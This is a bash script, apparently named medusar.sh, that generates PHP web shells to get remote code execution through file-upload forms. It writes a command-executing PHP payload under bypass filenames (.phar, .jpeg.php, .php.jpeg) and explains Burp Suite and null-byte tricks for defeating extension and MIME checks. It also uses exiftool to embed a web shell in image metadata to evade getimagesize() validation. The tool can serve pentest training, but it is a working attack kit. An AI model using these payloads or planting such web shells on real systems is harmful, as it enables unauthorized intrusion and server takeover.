#!/bin/bash

function _header_(){

cat << EOF

┌┬┐  ┌─┐  ┌┬┐  ┬ ┬  ┌─┐  ┌─┐  ┬─┐
│││  ├┤    ││  │ │  └─┐  ├─┤  ├┬┘
┴ ┴  └─┘  ─┴┘  └─┘  └─┘  ┴ ┴  ┴└─

EOF
}

function _help_(){
	printf "%s\n\n" "RCE File Upload Bypass"
	printf "%s\n" "options:"
        printf "%s\n" "--extension-no-control                 [ NO BYPASS ]"
        printf "%s\n" "--extension-blacklist                  [ BYPASS EXTENSION BLACKLIST ]"
        printf "%s\n" "--extension-control                    [ BYPASS EXTENSION CONTROL ]"
        printf "%s\n" "--extension-control-and-mime-type      [ BYPASS EXTENSION CONTROL & MIME TYPE ]"
        printf "%s\n" "--getimagesize                         [ BYPASS getimagesize() FUNCTION CONTROL ]"
        printf "%s\n" "--imagemagick                          (not available yet)"
	printf "%s\n" "--all                                  [ CREATE ALL BYPASS PAYLOADS ]"
	exit
}

function _php_payload_(){
cat << "EOF"
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>
EOF
}

filename="shell"

_header_

if [[ "$1" == "--extension-no-control" ]]
then
	printf "%s\n" "The php simply picks up the form file and will save it to the uploads folder, without any restrictions."
        printf "%s\n\n" "This allows us to upload any type of file, such as a php that allows us to execute commands."

	printf "[\e[0;32m+\e[0m] Generating .php payload\n"
	_php_payload_ > /tmp/$filename.php
	printf "%s\n" "File is in /tmp/$filename.php"

elif [[ "$1" == "--extension-blacklist" ]]
then

	printf "%s\n" "The extensions blacklist will be a list of file types that are not supported by the server."
        printf "%s\n" "The problem with this method is the large number of files that would be a risk to admit in the form, so it is recommended"
        printf "%s\n" "make the list backwards, that is, of those that are allowed."
        printf "%s\n" "For example, the code validates that the file is neither .php, nor plain text nor .exe"
        printf "%s\n" "In this example this does not assure us that php cannot be executed, since only by changing the .php to .phar it is also possible to execute php code."
        printf "%s\n" "Some extensions that run php are:"
	printf "%s\n\n" ".phar"

	printf "[\e[0;32m+\e[0m] Generating .phar payload\n"
	_php_payload_ > /tmp/$filename.phar
	printf "%s\n" "File is in /tmp/$filename.phar"

elif [[ "$1" == "--extension-control" ]]
then

	printf "%s\n" "In this case the php script will do a simple check if the extension is in the name string."
        printf "%s\n\n" "It is a very low security protection since simply changing our webshell.php to webshell.jpeg.php would allow us to upload it."

	printf "%s\n\n" "What extension is permited? (rename .jpeg.php to .png.php or .<filepermitedtoupload>.php)"
	printf "[\e[0;32m+\e[0m] Generating .jpeg.php payload\n"
	_php_payload_ > /tmp/$filename.jpeg.php
	printf "%s\n" "File is in /tmp/$filename.jpeg.php"

elif [[ "$1" == "--extension-control-and-mime-type" ]]
then
	printf "[\e[0;33m+\e[0m] \e[1mBURPSUITE\e[0m NEED, options: Modifying the extension or Null byte method\n\n"
	printf "%s\n\n" "(TL;DR)"
	printf "%s\n\n" "The php that controls the file upload in this case will check the type of file uploaded by using the FILES associative array."
        printf "%s\n" "This script checks that only png or jpeg are uploaded."
        printf "%s\n" "The problem with this method that it only checks the extension at the time of sending it, that is, on the client side. It also checks the content type."
        printf "%s\n\n" "We find several methods:"
        printf "\e[0;33mA\e[0m) Modifying the extension   [ easy ]\n"
        printf "%s\n" "We can intercept the POST request with the burpsuite and modify the extension with which it is going to save the file but we keep the MIME"
        printf "%s\n\n" "as if it were an image."
        printf "%s\n" "We will use the webshell.php whose code is in the upper section to exploit it and we simply change the name"
        printf "%s\n\n" "from webshell.php to webshell.php.jpeg in order to detect that the content type is jpeg."
        printf "\e[0;33mB\e[0m) Null byte   [ medium ]\n"
        printf "%s\n" "We can upload an image by changing the name of webshell.php to webshell.php.jpeg and introducing the Null byte behind php."
        printf "%s\n\n" "To do this, we intercept the upload of our file with BurpSuite and add a letter behind php, something like this:"
        printf "%s\n\n" "webshell.phpX.jpeg"
        printf "%s\n" "Looking in the hexadecimal of the POST intercepted by BurpSuite, we find the hexadecimal of the file name and modify"
        printf "%s\n" "the hexadecimal corresponding to our X by 00."
        printf "%s\n\n" "In this way it detects the NullByte and does not take into account the second extension when saving it so it would be like webshell.php"

	printf "[\e[0;32m+\e[0m] Generating .php.jpeg payload\n"
	_php_payload_ > /tmp/$filename.php.jpeg
	printf "%s\n\n" "File is in /tmp/$filename.php.jpeg"
	printf "[\e[0;33m+\e[0m] Time to open \e[1mBurpsuite\e[0m\n"
	printf "%s\n" "Go to proxy, intercept, open browser and modify $filename.php.jpg to $filename.php"


elif [[ "$1" == "--getimagesize" ]]
then

	if ! command -v exiftool &> /dev/null
	then
		printf "exiftool is not installed\nRun apt-get install exiftool -y\n"
		exit
        fi


	if [[ -z "$2" ]]
	then
		printf "%s\n" "--getimagesize needs second parameter as image file"
		exit
	else

		printf "%s\n" "The getimagesize() function obtains a series of information from the image, when the file that is passed to it is not an image, an error is obtained."
	        printf "%s\n\n" "Thanks to this, some programmers take advantage of it to validate the upload of images. This is exploitable."
        	printf "%s\n\n" "We can achieve RCE by adding a php script to the metadata of the image, as before we will use the webshell.php"
		printf "%s\n" "We just have to add a comment to the metadata with the php script to be executed, as we can see, the script does not close"
	        printf "%s\n" "and at the end __halt_compiler () is added; so that it does not execute the data of the image itself and the php compilation error."
        	printf "%s\n\n" "We just have to rename our image from $2.jpg to $2.jpg.php and we could upload it without problem."

		# avoid exiftool file already exists error #
		rm -r /tmp/$filename.php.phtml 2>/dev/null
		#                                          #
		printf "[\e[0;32m+\e[0m] Generating .php.phtml payload\n"
		exiftool -Comment="<?php echo '<form action=\''.\$PHP_SELF.'\' method=\'post\'>Command:<input type=\'text\' name=\'cmd\'><input type=\'submit\'></form>'; if(\$_POST){system(\$_POST['cmd']);} __halt_compiler();?>" "$2" -o /tmp/shell.php.phtml
		printf "%s\n" "File is in /tmp/$filename.php.phtml"
	fi

elif [[ "$1" == "--imagemagick" ]]
then
	printf "%s\n" "This option is not available yet, sorry"


elif [[ "$1" == "--all" ]]
then

	# [ NO BYPASS ]
        printf "[\e[0;32m+\e[0m] Generating .php payload\n\n"
        _php_payload_ > /tmp/$filename.php

	# [ BYPASS EXTENSION-BLACKLIST ]
	printf "[\e[0;32m+\e[0m] Generating .phar payload\n\n"
        _php_payload_ > /tmp/$filename.phar

	# [ BYPASS EXTENSION-CONTROL ]
        printf "[\e[0;32m+\e[0m] Generating .jpeg.php payload\n\n"
        _php_payload_ > /tmp/$filename.jpeg.php

	# [ BYPASS EXTENSION-CONTROL-AND-MIME-TYPE ]
	printf "[\e[0;32m+\e[0m] Generating .php.jpeg payload\n"
        _php_payload_ > /tmp/$filename.php.jpeg
        printf "[\e[0;33m+\e[0m] Time to open \e[1mBurpsuite\e[0m\n"
        printf "%s\n\n" "Go to proxy, intercept, open browser and modify $filename.php.jpg to $filename.php"

	# [ BYPASS getimagesize() FUNCTION ]
	if ! command -v exiftool &> /dev/null
        then
                printf "exiftool is not installed\nRun apt-get install exiftool -y\n"
                exit
        fi


        if [[ -z "$2" ]]
        then
                printf "%s\n" "getimagesize() function method needs second parameter as image file"
		printf "%s\n" "Example:"
		printf "%s\n" "bash medusar.sh --all /pictures/rose.jpeg"
                exit
        else

                # avoid exiftool file already exists error #
                rm -r /tmp/$filename.php.phtml 2>/dev/null
                #                                          #
                printf "[\e[0;32m+\e[0m] Generating .php.phtml payload\n\n"
                exiftool -Comment="<?php echo '<form action=\''.\$PHP_SELF.'\' method=\'post\'>Command:<input type=\'text\' name=\'cmd\'><input type=\'submit\'></form>'; if(\$_POST){system(\$_POST['cmd']);} __halt_compiler();?>" "$2" -o /tmp/shell.php.phtml
        fi


else

	_help_
	exit

fi
